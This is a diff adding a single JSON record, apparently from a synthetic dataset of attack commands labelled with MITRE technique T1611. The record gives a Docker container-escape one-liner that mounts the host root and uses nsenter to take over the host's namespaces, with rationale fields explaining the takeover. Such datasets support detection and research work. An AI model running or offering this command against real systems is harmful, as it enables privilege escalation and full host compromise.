@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-d4045100-4f03bda0",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run -v /:/mnt --rm alpine nsenter --target 1 --mount --uts --ipc --net --pid",
+  "explanation": "This command runs a new container using a base alpine image, mounts the host filesystem (/) into the container at /mnt to access the host, and uses nsenter to change namespaces to the host's namespaces.",
+  "rationale_steps": [
+    "Run a docker container using alpine image with host filesystem mounted.",
+    "Use nsenter to switch to the host's namespaces giving full control over the host."
+  ],
+  "source_prompt_hash": "d4045100",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:26:37.904929Z"
+}
